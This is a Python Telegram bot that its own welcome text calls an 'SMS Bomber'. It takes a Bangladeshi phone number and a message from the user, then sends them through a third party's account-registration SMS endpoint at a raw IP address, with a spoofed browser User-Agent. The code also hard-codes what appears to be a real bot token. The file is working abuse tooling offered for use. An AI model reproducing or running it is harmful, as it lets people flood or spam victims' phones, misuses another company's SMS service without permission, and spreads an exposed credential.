import telebot
from telebot import types
import requests
import json
from keep_alive import keep_alive

bot = telebot.TeleBot('7237381740:AAGoGZZKQjYUkHBJWd56Xb0fAxJExylP5f0') # বট টোকেন দিবেন 😐
user_states = {}

# Delete webhook if it exists


@bot.message_handler(commands=['start'])
def send_welcome(message):
    full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}"
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    bomb = types.KeyboardButton("SMS💬")
    keyboard.add(bomb)
    bot.reply_to(message, f"Welcome, {full_name}! \n Simple SMS Bomber Bot By : @Aftab \nChoose an option from below ", reply_markup=keyboard)

@bot.message_handler(func=lambda message: True)
def msg_all(message):
    chat_id = message.chat.id
    user_data = user_states.get(chat_id, None)

    if message.text == "SMS💬":
        bot.reply_to(message, "Enter your number \nWithout (+88) ")
        user_states[chat_id] = {"state": "waiting_for_number"}
        bot.register_next_step_handler(message, process_number)
    elif user_data and user_data["state"] == "waiting_for_number":
        process_number(message)

def process_number(message):
    chat_id = message.chat.id
    user_data = user_states.get(chat_id, None)
    number = message.text
    if number.isdigit() and len(number) == 11:  # Check if the number is 11 digits
        user_data["number"] = number
        user_data["state"] = "waiting_for_message"
        bot.send_message(chat_id, "Enter the message")
        bot.register_next_step_handler(message, process_message)
    else:
        bot.send_message(chat_id, "Number isn't valid. Please enter a valid 11-digit number.")

def process_message(message):
    chat_id = message.chat.id
    user_data = user_states.get(chat_id, None)
    msg = message.text
    number = user_data.get("number")

    if number and msg:
        bot.send_message(chat_id, f"Please wait, sending message to +88{number}")
        api_url = "http://202.51.182.198:8181/nbp/sms/code"
        headers = {
            "Authorization": "Bearer",
            "Language": "en",
            "Timezone": "Asia/Dhaka",
            "Content-Type": "application/json; charset=utf-8",
            "Content-Length": "137",
            "Host": "202.51.182.198:8181",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
        }
        data = json.dumps({
            "receiver": number,
            "text": msg,
            "title": "Register Account"
        })
        response = requests.post(api_url, headers=headers, data=data)
        response_text = response.text

        if "request.over.max.count" in response_text:
            bot.send_message(chat_id, "Please try again later ⚠️")
        elif "operate.success" in response_text:
            bot.send_message(chat_id, "SMS sent successfully ✅")
        else:
            bot.send_message(chat_id, "An error occurred while sending the message.")

        user_states.pop(chat_id, None)
    else:
        bot.send_message(chat_id, "Unknown bug. Please try again.")

if __name__ == "__main__":
    keep_alive()
    bot.polling()
